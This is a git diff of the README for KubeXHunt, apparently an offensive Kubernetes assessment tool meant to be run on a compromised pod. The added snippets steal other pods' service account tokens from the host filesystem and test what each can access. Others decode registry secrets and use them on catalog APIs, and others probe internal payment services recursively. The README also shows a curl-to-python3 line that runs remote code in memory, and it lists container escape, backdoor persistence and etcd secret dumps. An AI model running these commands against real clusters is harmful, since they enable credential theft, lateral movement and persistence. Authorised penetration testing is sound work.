@@ -2,7 +2,7 @@
 
 ## 🛠️ KubeXHunt — Automated Kubernetes Security Assessment Tool
 
-> KubeXHunt is a Kubernetes security assessment tool designed to help security engineers and penetration testers evaluate the security posture of Kubernetes clusters from an attacker's perspective.
+> KubeXHunt is an open-source Kubernetes security assessment tool designed to help security engineers and penetration testers evaluate the security posture of Kubernetes clusters from an attacker's perspective.
 > KubeXHunt enumerates Kubernetes resources, analyzes configurations, and reports findings in a clear pass/fail format — allowing security teams to quickly identify weaknesses and demonstrate real-world impact without causing destructive changes to the cluster.
 
 > **Drop this tool onto any compromised pod and run a full automated assessment of the entire cluster.**
@@ -41,11 +41,14 @@
 ### ⬇️ Download & Run
 
 ```bash
-# Download on the compromised pod
+
 git clone https://github.com/mr-xhunt/kubeXhunt.git
+cd kubeXhunt
+
+# Alternatively directly download the tool on the compromised pod
+wget https://raw.githubusercontent.com/mr-xhunt/kubeXhunt/refs/heads/main/kubexhunt.py
 
 # Run full assessment
-cd kubeXhunt
 python3 kubexhunt.py
 ```
 
@@ -114,7 +117,7 @@ python3 kubexhunt.py --phase-list
 
 ```bash
 # Run directly in memory — nothing written to disk
-curl -s https://raw.githubusercontent.com/mr-xhunt/Kubernetest-Assessment/refs/heads/main/kubexhunt.py | python3 - --fast
+curl -s https://raw.githubusercontent.com/mr-xhunt/kubeXhunt/refs/heads/main/kubexhunt.py | python3 - --fast
 ```
 
 ---
@@ -125,12 +128,12 @@ curl -s https://raw.githubusercontent.com/mr-xhunt/Kubernetest-Assessment/refs/h
 |-------|------|----------------|
 | `0` | Setup & kubectl Install | Auto-installs kubectl, searches host filesystem for existing binary, auto-configures in-cluster kubeconfig from SA token, detects cloud (AWS/GKE/Azure/OpenShift), scores token privilege |
 | `1` | Pod & Container Recon | Capabilities (CapEff), seccomp, AppArmor, privileged, hostPID, hostNetwork, block devices, runtime socket, container runtime detection (containerd/docker/cri-o via host filesystem + kubectl) |
-| `2` | Cloud Metadata & IAM | IMDSv1/v2 credential theft, GKE OAuth token, node SA scopes, IRSA token abuse, env var cloud fingerprinting |
-| `3` | K8s API & RBAC | SA permissions, secret theft, wildcard RBAC, impersonation, bind/escalate/TokenRequest abuse, cluster-admin bindings, configmap credential scan |
+| `2` | Cloud Metadata & IAM | IMDSv1/v2 credential theft, GKE OAuth token, node SA scopes, IRSA token abuse |
+| `3` | K8s API & RBAC | SA permissions, secret theft, wildcard RBAC, impersonation, bind/escalate/TokenRequest abuse, cluster-admin bindings |
 | `4` | Network & Lateral Movement | Service discovery, DNS brute-force + SRV, recursive endpoint walking (advertises own endpoints), port scan, Istio/mTLS awareness, NetworkPolicy gaps, service mesh CRD detection, sniffing |
 | `5` | Container Escape | nsenter, chroot, Docker/containerd socket, cgroup v1 release_agent, user namespace unshare |
 | `6` | Node Compromise | Kubelet certs, projected volume SA token decode (sub field), all stolen tokens permission-tested, token privilege ranking (0-100), SSH keys, kubeconfig files |
-| `7` | Cluster Escalation | Privileged pod creation, ClusterRoleBinding escalation, webhook failurePolicy + TCP reachability bypass, etcd encryption check, controller hijacking |
+| `7` | Cluster Escalation | Privileged pod creation, ClusterRoleBinding escalation, webhook failurePolicy bypass, etcd encryption check, controller hijacking |
 | `8` | Persistence | Backdoor SA in kube-system, DaemonSet on all nodes, CronJob persistence, sidecar injection |
 | `9` | Supply Chain | Image signing (webhook + Kyverno CRD fallback), registry credential pivot (catalog API probe), PSS enforcement, Kyverno v1/v2 policies (403=installed), admission plugins |
 | `10` | EKS-Specific | aws-auth read/write, IRSA tokens, node IAM role, account enumeration |
@@ -138,9 +141,9 @@ curl -s https://raw.githubusercontent.com/mr-xhunt/Kubernetest-Assessment/refs/h
 | `12` | Runtime Security | Multi-method detection: pod names + CRD probes + filesystem (403=installed), Tetragon TracingPolicies, Kyverno, Istio PeerAuthentication, exec-from-/tmp enforcement probe |
 | `13` | Secrets & Data | Env var credential scan, mounted secret files, app config credential grep |
 | `14` | DoS & Resource Limits | cgroup v1/v2 memory/CPU limits, ResourceQuota, LimitRange, audit logging (self-managed + EKS CloudWatch detection) |
-| `15` | Cluster Intel & CVEs ⭐ | K8s version → real version-gated CVE comparison (not blanket fire), runc CVE-2024-21626 via containerd version mapping, kernel CVE range check (Linux only), API server public IP check, worker node public IP check, node enumeration with 5-method IP fallback |
+| `15` | Cluster Intel & CVEs ⭐ | K8s version → real version-gated CVE comparison (no blanket fire), runc CVE-2024-21626 via containerd version mapping, kernel CVE range check (Linux only), API server public IP check, worker node public IP check, node enumeration with 5-method IP fallback |
 | `16` | Kubelet Exploitation ⭐ | Real node IPs via `_get_node_ips()` (kubectl/kubelet config/fib_trie/hostname -I/Downward API), port 10255 anonymous, port 10250 auth bypass, /pods credential harvest |
-| `17` | etcd Exposure ⭐ | Real node IPs, port 2379/2380 probe, no-TLS access, mTLS bypass, v3 keys endpoint |
+| `17` | etcd Exposure ⭐ | Real node IPs, port 2379/2380 probe, no-TLS access, mTLS bypass, v3 keys endpoint secret dump |
 | `18` | Helm & App Secrets ⭐ | Helm release secret decode (base64+gzip), imagePullSecrets cluster-wide, app filesystem credential scan |
 | `19` | /proc Credential Harvest ⭐ | /proc/self/environ, co-process environ (cgroup-deduplicated from hostPID), hostPID host process scanning (kubelet/etcd/containerd only), Redis/ArgoCD token capture, Downward API node name extraction |
 | `20` | Azure AKS ⭐ | IMDS instance info, Managed Identity token theft (4 resources), Workload Identity, azure.json SP creds, AAD Pod Identity NMI |
@@ -293,32 +296,32 @@ Output shows new findings (regressions), fixed findings (improvements), and seve
 | # | Phase | Focus |
 |---|-------|-------|
 | [0](#-phase-0-pre-assessment-setup) | Pre-Assessment Setup | Confirm RCE, grab SA token, auto-configure kubectl in-cluster |
-| [1](#-phase-1-pod--container-recon) | Pod & Container Recon | Capabilities, mounts, hostPID, hostNetwork, runtime detection |
-| [2](#-phase-2-cloud-metadata--iam-credentials) | Cloud Metadata & IAM | AWS IMDS, GKE metadata, credential theft, env var fingerprint |
-| [3](#-phase-3-kubernetes-api-enumeration-via-rbac) | K8s API Enumeration | RBAC exploitation, secret theft, cluster map, impersonation |
+| [1](#-phase-1-pod--container-recon) | Pod & Container Recon | Capabilities, mounts, hostPID, hostNetwork |
+| [2](#-phase-2-cloud-metadata--iam-credentials) | Cloud Metadata & IAM | AWS IMDS, GKE metadata, credential theft |
+| [3](#-phase-3-kubernetes-api-enumeration-via-rbac) | K8s API Enumeration | RBAC exploitation, secret theft, cluster map |
 | [4](#-phase-4-network-recon--lateral-movement) | Network Recon & Lateral Movement | Service discovery, port scan, recursive endpoint walk, Istio-aware pivot |
-| [5](#-phase-5-container-escape) | Container Escape | nsenter, chroot, socket, cgroup v1 release_agent |
+| [5](#-phase-5-container-escape) | Container Escape | nsenter, chroot, socket, cgroup |
 | [6](#-phase-6-node-level-compromise) | Node-Level Compromise | Kubelet certs, projected token decode, full permission test on all stolen tokens |
-| [7](#-phase-7-cluster-wide-privilege-escalation) | Cluster Privilege Escalation | Cluster-admin, privileged pods, webhook TCP probe, etcd encryption |
-| [8](#-phase-8-persistence-techniques) | Persistence | Backdoor SA, DaemonSet, CronJob, sidecar injection |
+| [7](#-phase-7-cluster-wide-privilege-escalation) | Cluster Privilege Escalation | Cluster-admin, privileged pods, etcd |
+| [8](#-phase-8-persistence-techniques) | Persistence | Backdoor SA, DaemonSet, sidecar injection |
 | [9](#-phase-9-supply-chain--admission-control-gaps) | Supply Chain & Admission | Image signing (webhook + Kyverno CRD fallback), registry catalog pivot, PSS, Kyverno v1/v2 |
-| [10](#-phase-10-eks-specific-tests) | EKS-Specific | aws-auth, IRSA, node IAM, CloudWatch audit |
-| [11](#-phase-11-gke-specific-tests) | GKE-Specific | Workload Identity, legacy metadata, scopes, Dashboard |
+| [10](#-phase-10-eks-specific-tests) | EKS-Specific | aws-auth, IRSA, node IAM, CloudWatch |
+| [11](#-phase-11-gke-specific-tests) | GKE-Specific | Workload Identity, legacy metadata, scopes |
 | [12](#-phase-12-runtime-security-gaps) | Runtime Security Gaps | Tetragon/Falco/Kyverno/Istio via pods + CRDs + filesystem, TracingPolicy, exec-from-/tmp |
 | [13](#-phase-13-secrets--sensitive-data) | Secrets & Sensitive Data | Env vars, mounted files, app configs |
 | [14](#-phase-14-dos--resource-exhaustion-proof) | DoS & Resource Exhaustion | cgroup v1/v2 limits, ResourceQuota, LimitRange, audit logging (self-managed + EKS CloudWatch) |
 | [15](#-phase-15-cluster-intelligence--cve-detection) | Cluster Intel & CVEs ⭐ | Real CVE version comparison, runc version check, API server public IP, worker node public IPs, node enum with 5-method fallback |
 | [16](#-phase-16-kubelet-exploitation) | Kubelet Exploitation ⭐ | Real node IP via `_get_node_ips()`, anonymous kubelet, /pods credential harvest |
 | [17](#-phase-17-etcd-exposure) | etcd Exposure ⭐ | Real node IP probing, unauthenticated etcd, TLS bypass, secret dump |
-| [18](#-phase-18-helm--application-secrets) | Helm & App Secrets ⭐ | Helm release decode (base64+gzip), imagePullSecrets cluster-wide |
+| [18](#-phase-18-helm--application-secrets) | Helm & App Secrets ⭐ | Helm release decode, imagePullSecrets |
 | [19](#-phase-19-proc-credential-harvesting) | /proc Harvesting ⭐ | Process env harvest, cgroup-based pod PID dedup, hostPID host-only scanning, Redis/ArgoCD capture |
-| [20](#-phase-20-azure-aks) | Azure AKS ⭐ | IMDS, Managed Identity, Workload Identity, azure.json SP creds |
-| [21](#-phase-21-openshift--okd) | OpenShift / OKD ⭐ | SCCs, routes, OAuth, internal registry |
+| [20](#-phase-20-azure-aks) | Azure AKS ⭐ | IMDS, Managed Identity, Workload Identity |
+| [21](#-phase-21-openshift--okd) | OpenShift / OKD ⭐ | SCCs, routes, OAuth, registry |
 | [22](#-phase-22-advanced-red-team-techniques) | Advanced Red Team ⭐ | Token audience, DNS poisoning, controller hijack |
-| [23](#-phase-23-real-world-attack-chain-simulation) | Attack Chain Simulation ⭐ | 4 complete real-world attack chain proofs |
+| [23](#-phase-23-real-world-attack-chain-simulation) | Attack Chain Simulation ⭐ | 4 complete attack chain proofs |
 | [24](#-phase-24-stealth--evasion-analysis) | Stealth & Evasion ⭐ | Audit impact classification, --no-mutate PASS, runtime tool detection from CTX |
 | [25](#-phase-25-network-plugin--misc) | Network Plugin & Misc ⭐ | CNI, kube-proxy, SA token audit |
-| [26](#-phase-26-diff--reporting) | Diff & Reporting ⭐ | CI/CD diff, regression detection, exit code 1 on new CRITICAL/HIGH |
+| [26](#-phase-26-diff--reporting) | Diff & Reporting ⭐ | CI/CD diff, regression detection |
 | [↓](#-findings-summary-template) | Findings Template | Severity matrix, EKS vs GKE vs Azure vs OpenShift table |
 
 ---
@@ -339,12 +342,17 @@ Output shows new findings (regressions), fixed findings (improvements), and seve
 > [!NOTE]
 > Run this first. Sets up variables used throughout every other phase.
 
-```# Confirm execution context
+```bash
+# Confirm execution context
 id && whoami && hostname
 uname -a
 cat /etc/os-release
 
-# Grab service account credentials
+# Check what we can see
+env | sort
+cat /proc/self/status | grep -E "^Name|^Pid|^PPid|^Cap"
+
+# Grab service account credentials (used in every Phase 3+ test)
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
 CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
 NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
@@ -356,19 +364,16 @@ echo "Token     : $([ -n "$TOKEN" ] && echo "✅ PRESENT" || echo "❌ MISSING")
 echo "API       : $API"
 echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
 
-# Configure kubectl with in-cluster credentials (if kubeconfig is empty)
+# Auto-configure kubectl from SA token if kubeconfig is empty
+# kubectl inside a pod has no kubeconfig by default — every command fails
+# with "couldn't get current server API group list" without this step
 kubectl config view | grep -q "clusters: null" && {
   echo "Configuring kubectl from SA token..."
-  kubectl config set-cluster in-cluster \
-    --server=$API \
-    --certificate-authority=$CACERT
+  kubectl config set-cluster in-cluster     --server=$API     --certificate-authority=$CACERT
   kubectl config set-credentials $NS-sa --token=$TOKEN
-  kubectl config set-context default \
-    --cluster=in-cluster \
-    --user=$NS-sa \
-    --namespace=$NS
+  kubectl config set-context default     --cluster=in-cluster     --user=$NS-sa     --namespace=$NS
   kubectl config use-context default
-  echo "✅ kubectl configured"
+  echo "✅ kubectl configured with in-cluster credentials"
 }
 ```
 
@@ -797,31 +802,91 @@ for host in targets:
 
 ### 4.3 Lateral Movement — Accessing Internal APIs
 
-> 🔴 **CRITICAL** — plain HTTP exposes PII, card data, credentials
+> 🔴 **CRITICAL** — plain HTTP exposes PII, card data, credentials. If the service
+> returns an endpoint list in its response the tool automatically probes all advertised
+> endpoints recursively — e.g. `{"endpoints":["/health","/transactions","/customers"]}`
 
 ```bash
 python3 -c "
-import urllib.request
-targets = [
-    'http://payment-api.payments:8080/transactions',
-    'http://payment-api.payments:8080/customers',
-    'http://payment-api.payments:8080/admin',
-    'http://payment-api.payments:8080/metrics',
-]
-for url in targets:
+import urllib.request, json
+
+def probe(url, visited=set()):
+    if url in visited: return
+    visited.add(url)
     try:
         r = urllib.request.urlopen(url, timeout=3)
-        body = r.read()[:300].decode(errors='replace')
+        body = r.read()[:400].decode(errors='replace')
         print(f'🔴 REACHABLE [{r.status}]: {url}')
+        sensitive = any(kw in body.lower() for kw in
+            ['password','secret','token','card','customer','transaction'])
+        if sensitive: print(f'   ⚠ Sensitive data in response!')
         print(f'   {body[:150]}')
+        # Parse advertised endpoints and recursively probe all of them
+        try:
+            d = json.loads(body)
+            for key in ['endpoints','paths','routes','links']:
+                for ep in d.get(key, []):
+                    if str(ep).startswith('/'):
+                        base = url.split('//')[1].split('/')[0]
+                        probe(f'http://{base}{ep}', visited)
+        except: pass
     except Exception as e:
         print(f'✅  BLOCKED: {url} ({str(e)[:60]})')
+
+# Seed with discovered service roots — the tool handles the rest
+targets = [
+    'http://payment-api.payments:8080/',
+    'http://checkout.payments:8080/',
+]
+for t in targets:
+    probe(t)
 "
 ```
 
 ---
 
-### 4.4 Network Traffic Sniffing
+### 4.4 Istio / Service Mesh Detection
+
+> ℹ️ **INFO** — CRD-based detection works even without pod list permission.
+> HTTP 403 = CRD exists = Istio is installed. STRICT mTLS explains why some
+> HTTP probes return PASS despite ports being open at TCP level.
+
+```bash
+# Check Istio CRDs — 200 = can list, 403 = installed but restricted (both = Istio present)
+for path in   "apis/networking.istio.io/v1alpha3/peerauthentications"   "apis/security.istio.io/v1/authorizationpolicies"   "apis/networking.istio.io/v1alpha3/virtualservices"; do
+  CODE=$(curl -sk -o /dev/null -w "%{http_code}"     -H "Authorization: Bearer $TOKEN" $API/$path)
+  [ "$CODE" = "200" ] || [ "$CODE" = "403" ] &&     echo "✅ Istio CRD present: $path (HTTP $CODE)" ||     echo "❌ Not found: $path"
+done
+
+# PeerAuthentication — verify STRICT mTLS is enforced per namespace
+curl -sk -H "Authorization: Bearer $TOKEN"   $API/apis/security.istio.io/v1/peerauthentications 2>/dev/null |   python3 -c "
+import sys, json
+d = json.load(sys.stdin)
+for p in d.get('items', []):
+    mode = p.get('spec',{}).get('mtls',{}).get('mode','?')
+    ns   = p['metadata']['namespace']
+    name = p['metadata']['name']
+    icon = '✅' if mode == 'STRICT' else '🟠'
+    print(f'{icon} PeerAuthentication {ns}/{name}: mtls.mode={mode}')
+" 2>/dev/null
+
+# AuthorizationPolicy — what traffic is allowed/denied
+curl -sk -H "Authorization: Bearer $TOKEN"   $API/apis/security.istio.io/v1/authorizationpolicies 2>/dev/null |   python3 -c "
+import sys, json
+d = json.load(sys.stdin)
+policies = d.get('items', [])
+print(f'AuthorizationPolicies: {len(policies)}')
+for p in policies:
+    ns     = p['metadata']['namespace']
+    name   = p['metadata']['name']
+    action = p.get('spec',{}).get('action','ALLOW')
+    print(f'  {ns}/{name} → {action}')
+" 2>/dev/null
+```
+
+---
+
+### 4.5 Network Traffic Sniffing
 
 > 🔴 **CRITICAL** — plaintext PII, credentials, session tokens visible
 
@@ -922,33 +987,41 @@ curl -sk \
 
 ### 6.2 Steal Other Pods' SA Tokens
 
-> 🔴 **CRITICAL** — pivot to any service account on the node
+> 🔴 **CRITICAL** — pivot to any service account on the node.
+> Handles both legacy secret-based tokens and modern projected volume tokens
+> (projected tokens use the `sub` field instead of the `kubernetes.io/serviceaccount/` claims).
 
 ```bash
-find /host/var/lib/kubelet/pods -name "token" 2>/dev/null | while read t; do
-  TOKEN_VAL=$(cat "$t")
-  SA_INFO=$(echo "$TOKEN_VAL" | python3 -c "
-import sys, base64, json
-token = sys.stdin.read().strip()
-parts = token.split('.')
-if len(parts) >= 2:
-    payload = parts[1] + '=='
-    try:
-        decoded = json.loads(base64.urlsafe_b64decode(payload))
-        sa = decoded.get('kubernetes.io/serviceaccount/service-account.name','?')
-        ns = decoded.get('kubernetes.io/serviceaccount/namespace','?')
-        print(f'{ns}/{sa}')
-    except: pass
-" 2>/dev/null)
-  echo "  🔑 $t → $SA_INFO"
-done
+# Find tokens — exclude the dated symlink to avoid duplicates
+find /host/var/lib/kubelet/pods -name "token"   -not -path "*..data*" 2>/dev/null | sort -u | while read t; do
+  TOKEN_VAL=$(cat "$t" 2>/dev/null)
+  [ -z "$TOKEN_VAL" ] && continue
 
-# Check if any stolen token can list secrets
-find /host/var/lib/kubelet/pods -name "token" 2>/dev/null | while read t; do
-  T=$(cat "$t")
-  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
-    -H "Authorization: Bearer $T" https://kubernetes.default/api/v1/secrets)
-  [ "$CODE" = "200" ] && echo "🔴 HIGH-PRIV TOKEN: $t (can list cluster secrets)"
+  SA_INFO=$(python3 -c "
+import base64, json
+token = open('$t').read().strip()
+parts = token.split('.')
+if len(parts) < 2: exit(1)
+payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
+# Standard secret-based token claims
+sa = payload.get('kubernetes.io/serviceaccount/service-account.name','')
+ns = payload.get('kubernetes.io/serviceaccount/namespace','')
+# Projected volume tokens use sub field: system:serviceaccount:<ns>:<sa>
+if not sa or not ns:
+    sub = payload.get('sub','')
+    if sub.startswith('system:serviceaccount:'):
+        p = sub.split(':')
+        ns, sa = p[2], p[3]
+print(f'{ns}/{sa}')
+" 2>/dev/null)
+
+  echo "  🔑 $SA_INFO — $t"
+
+  # Test permissions of every stolen token — not just the first few
+  for path in "/api/v1/secrets" "/api/v1/nodes"               "/api/v1/namespaces"               "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings"; do
+    CODE=$(curl -sk -o /dev/null -w "%{http_code}"       -H "Authorization: Bearer $TOKEN_VAL"       https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}$path)
+    [ "$CODE" = "200" ] && echo "    🔴 ALLOWED: $path"
+  done
 done
 ```
 
@@ -1092,37 +1165,85 @@ echo "DaemonSet: $([ "$RESULT" = "201" ] && echo "🔴 CREATED — runs on ALL n
 ### 9.1 Image Signing Check
 
 ```bash
-curl -sk -H "Authorization: Bearer $TOKEN" \
-  $API/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations | \
-  python3 -c "
+# Method 1: Admission webhook list
+curl -sk -H "Authorization: Bearer $TOKEN"   $API/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations |   python3 -c "
 import sys, json
 d = json.load(sys.stdin)
 names = [wh['metadata']['name'] for wh in d.get('items',[])]
 signing_tools = ['kyverno','cosign','sigstore','notary','connaisseur']
 found = [n for n in names if any(t in n.lower() for t in signing_tools)]
-print(f'✅ Image signing: {found}' if found else '🟠 No image signing webhook')
+print(f'✅ Image signing webhooks: {found}' if found else '⚠ No image signing webhook found via list')
+" 2>/dev/null
+
+# Method 2: Kyverno CRD fallback — works when webhook list returns 401/403
+# HTTP 403 means Kyverno is installed but SA cannot list policies — still a PASS
+for api_path in   "apis/kyverno.io/v1/clusterpolicies"   "apis/kyverno.io/v2beta1/clusterpolicies"; do
+  CODE=$(curl -sk -o /dev/null -w "%{http_code}"     -H "Authorization: Bearer $TOKEN" $API/$api_path)
+  if [ "$CODE" = "200" ]; then
+    curl -sk -H "Authorization: Bearer $TOKEN" $API/$api_path |       python3 -c "
+import sys, json
+d = json.load(sys.stdin)
+policies = d.get('items', [])
+verify = [p['metadata']['name'] for p in policies
+          if 'verifyimage' in str(p.get('spec',{})).lower()]
+print(f'✅ Kyverno installed: {len(policies)} policies')
+if verify: print(f'✅ verifyImages policies: {verify}')
 "
+    break
+  elif [ "$CODE" = "403" ]; then
+    echo "✅ Kyverno installed — ClusterPolicies not readable (HTTP 403 = CRD exists)"
+    break
+  fi
+done
 ```
 
 ---
 
-### 9.2 Registry Credential Theft
+### 9.2 Registry Credential Theft & Pivot
 
-> 🟠 **HIGH** — pull any private image, push backdoored images
+> 🟠 **HIGH** — pull any private image, push backdoored images.
+> After finding credentials, the tool probes the registry catalog API to prove
+> actual pull access and enumerate all available repositories.
 
 ```bash
-curl -sk -H "Authorization: Bearer $TOKEN" \
-  $API/api/v1/namespaces/$NS/secrets | \
-  python3 -c "
-import sys, json, base64
+# Find and decode registry secrets
+curl -sk -H "Authorization: Bearer $TOKEN"   $API/api/v1/namespaces/$NS/secrets |   python3 -c "
+import sys, json, base64, urllib.request, ssl
+
 d = json.load(sys.stdin)
 for s in d.get('items', []):
-    if s.get('type') == 'kubernetes.io/dockerconfigjson':
-        print(f'🔴 Registry secret: {s[\"metadata\"][\"name\"]}')
-        cfg = s.get('data', {}).get('.dockerconfigjson', '')
-        if cfg:
-            decoded = base64.b64decode(cfg).decode()
-            print(f'   Config: {decoded[:300]}')
+    if s.get('type') != 'kubernetes.io/dockerconfigjson': continue
+    cfg_b64 = s.get('data',{}).get('.dockerconfigjson','')
+    if not cfg_b64: continue
+    cfg = json.loads(base64.b64decode(cfg_b64))
+    for registry, creds in cfg.get('auths',{}).items():
+        # Decode credentials — may be in auth field or username/password
+        auth_raw = creds.get('auth','')
+        if auth_raw:
+            decoded  = base64.b64decode(auth_raw).decode()
+            user, _, password = decoded.partition(':')
+        else:
+            user     = creds.get('username','')
+            password = creds.get('password','')
+        print(f'🔴 Registry secret: {s["metadata"]["name"]}')
+        print(f'   Registry: {registry} | User: {user}')
+
+        # Pivot — probe catalog endpoint to prove pull access
+        base = registry if registry.startswith('http') else f'https://{registry}'
+        auth_header = base64.b64encode(f'{user}:{password}'.encode()).decode()
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+        for ep in ['/v2/_catalog', '/api/v2.0/repositories?page_size=20']:
+            try:
+                req = urllib.request.Request(f'{base}{ep}',
+                    headers={'Authorization': f'Basic {auth_header}'})
+                r = urllib.request.urlopen(req, context=ctx, timeout=5)
+                body = r.read().decode()
+                print(f'   🔴 CATALOG ACCESSIBLE: {ep}')
+                print(f'   {body[:200]}')
+                break
+            except Exception as e:
+                print(f'   {ep}: {str(e)[:60]}')
 "
 ```
 
@@ -1235,12 +1356,12 @@ curl -s --max-time 5 \
 ### 12.1 Detect Runtime Security Tools
 
 ```bash
-curl -sk -H "Authorization: Bearer $TOKEN" \
-  $API/api/v1/namespaces/kube-system/pods | \
-  python3 -c "
+# Method 1: Pod names in kube-system (requires pod list permission)
+curl -sk -H "Authorization: Bearer $TOKEN"   $API/api/v1/namespaces/kube-system/pods |   python3 -c "
 import sys, json
 d = json.load(sys.stdin)
-tools = {'tetragon':'🔴 Tetragon eBPF','falco':'🟡 Falco','sysdig':'🟡 Sysdig','aqua':'🟡 Aqua','datadog':'🔵 Datadog'}
+tools = {'tetragon':'🟢 Tetragon eBPF enforcement','falco':'🟡 Falco (alerts only)',
+         'sysdig':'🟡 Sysdig','aqua':'🟡 Aqua Security','datadog':'🔵 Datadog'}
 found = set()
 for p in d.get('items', []):
     name = p['metadata']['name'].lower()
@@ -1248,8 +1369,37 @@ for p in d.get('items', []):
         if tool in name and tool not in found:
             print(msg); found.add(tool)
 if not found:
-    print('🔴 No runtime security tooling detected')
-"
+    print('  No runtime tools found via pod names')
+" 2>/dev/null
+
+# Method 2: CRD-based detection — works even when pod list returns 401/403
+# HTTP 403 = CRD exists but SA cannot list = tool is installed
+for crd_path in   "apis/cilium.io/v1alpha1/tracingpolicies:Tetragon"   "apis/falco.org/v1alpha1/falcoconfigs:Falco"   "apis/kyverno.io/v1/clusterpolicies:Kyverno"   "apis/networking.istio.io/v1alpha3/peerauthentications:Istio"   "apis/security.istio.io/v1/authorizationpolicies:Istio"; do
+  path="${crd_path%%:*}"; tool="${crd_path##*:}"
+  CODE=$(curl -sk -o /dev/null -w "%{http_code}"     -H "Authorization: Bearer $TOKEN" $API/$path)
+  [ "$CODE" = "200" ] && echo "✅ $tool detected (HTTP 200 — can list)"
+  [ "$CODE" = "403" ] && echo "✅ $tool detected (HTTP 403 — CRD exists, restricted)"
+  [ "$CODE" = "404" ] && echo "❌ $tool not found (HTTP 404)"
+done
+
+# Method 3: Filesystem markers (works even without API access)
+for path in "/etc/tetragon" "/etc/falco/falco.yaml" "/etc/falco"; do
+  [ -e "$path" ] && echo "✅ Found on filesystem: $path"
+done
+
+# Tetragon TracingPolicies — enumerate active enforcement rules
+kubectl get tracingpolicies 2>/dev/null ||   curl -sk -H "Authorization: Bearer $TOKEN"     $API/apis/cilium.io/v1alpha1/tracingpolicies |     python3 -c "
+import sys, json
+try:
+    d = json.load(sys.stdin)
+    policies = d.get('items', [])
+    if policies:
+        print(f'✅ TracingPolicies active: {len(policies)}')
+        for p in policies: print(f'   • {p["metadata"]["name"]}')
+    else:
+        print('🟠 Tetragon installed but NO TracingPolicies active — observing only')
+except: pass
+" 2>/dev/null
 ```
 
 ---
@@ -1308,24 +1458,54 @@ find /app /config /etc/app /srv /opt 2>/dev/null -type f \
 ## 💥 Phase 14: DoS & Resource Exhaustion
 
 ```bash
-# Memory limit
-MEM=$(cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null || cat /sys/fs/cgroup/memory.max 2>/dev/null)
-[ "$MEM" = "9223372036854771712" ] || [ "$MEM" = "max" ] && \
-  echo "🔴 NO MEMORY LIMIT" || echo "✅ Memory: $(echo $MEM | awk '{printf "%.0f MB",$1/1024/1024}')"
+# Memory limit — check both cgroup v1 (most clusters) and cgroup v2 (EKS AL2023+)
+echo "=== Memory Limit ==="
+for path in   "/sys/fs/cgroup/memory/memory.limit_in_bytes"   "/sys/fs/cgroup/memory.max"; do
+  [ -f "$path" ] || continue
+  val=$(cat "$path" 2>/dev/null)
+  if [ "$val" = "9223372036854771712" ] || [ "$val" = "max" ]; then
+    echo "🔴 NO MEMORY LIMIT ($path = $val) — pod can OOM the node"
+  else
+    mb=$(python3 -c "print(f'{int("$val")//1024//1024} MB')" 2>/dev/null)
+    echo "✅ Memory limit: $mb ($path)"
+  fi
+done
 
-# CPU quota
-CPU=$(cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us 2>/dev/null | head -1)
-[ "$CPU" = "-1" ] && echo "🔴 NO CPU LIMIT" || echo "✅ CPU quota: ${CPU}us"
+# cgroup v2 unified hierarchy fallback (EKS Amazon Linux 2023)
+if [ ! -f "/sys/fs/cgroup/memory/memory.limit_in_bytes" ] &&    [ ! -f "/sys/fs/cgroup/memory.max" ]; then
+  cg=$(cat /proc/self/cgroup | head -1 | cut -d: -f3)
+  val=$(cat /sys/fs/cgroup${cg}/memory.max 2>/dev/null)
+  [ "$val" = "max" ] && echo "🔴 NO MEMORY LIMIT (cgroup v2)" ||     echo "✅ Memory (cgroup v2): $val"
+fi
+
+# CPU quota — check both cgroup v1 and v2
+echo "=== CPU Limit ==="
+cpu_v1=$(cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us 2>/dev/null)
+cpu_v2=$(cat /sys/fs/cgroup/cpu.max 2>/dev/null | awk '{print $1}')
+val="${cpu_v1:-$cpu_v2}"
+[ "$val" = "-1" ] || [ "$val" = "max" ] &&   echo "🔴 NO CPU LIMIT — pod can starve other workloads of CPU" ||   echo "✅ CPU limit: ${val}us/period"
 
 # ResourceQuota
-curl -sk -H "Authorization: Bearer $TOKEN" \
-  $API/api/v1/namespaces/$NS/resourcequotas | \
-  python3 -c "
+curl -sk -H "Authorization: Bearer $TOKEN"   $API/api/v1/namespaces/$NS/resourcequotas |   python3 -c "
 import sys, json
 d = json.load(sys.stdin)
 items = d.get('items', [])
 print('🟡 No ResourceQuota' if not items else f'✅ {len(items)} quota(s) active')
 "
+
+# Audit logging detection — self-managed or EKS CloudWatch
+echo "=== Audit Logging ==="
+
+# Self-managed: check kube-apiserver pod flags
+kubectl -n kube-system get pod -l component=kube-apiserver   -o jsonpath='{.items[0].spec.containers[0].command}' 2>/dev/null |   python3 -c "
+import sys, json
+cmd = ' '.join(json.load(sys.stdin))
+print('✅ Audit enabled (--audit-log-path)' if '--audit-log-path' in cmd else '🔴 No --audit-log-path flag')
+print('✅ Audit policy set'                if '--audit-policy-file' in cmd else '🟠 No --audit-policy-file flag')
+" 2>/dev/null
+
+# EKS: verify CloudWatch log groups
+aws logs describe-log-groups   --log-group-name-prefix /aws/eks   --region ${AWS_DEFAULT_REGION:-ap-south-1}   --query 'logGroups[*].logGroupName'   --output text 2>/dev/null &&   echo "✅ EKS audit logs present in CloudWatch" ||   echo "🟠 No EKS audit log groups — may not be enabled"
 ```
 
 ---
@@ -1338,14 +1518,84 @@ print('🟡 No ResourceQuota' if not items else f'✅ {len(items)} quota(s) acti
 # Fingerprint K8s version
 curl -sk -H "Authorization: Bearer $TOKEN" $API/version | python3 -m json.tool
 
-# Cross-reference against embedded CVE database (9 K8s CVEs + 5 kernel CVEs)
-# Tool checks: CVE-2018-1002105, CVE-2019-11247, CVE-2021-25741,
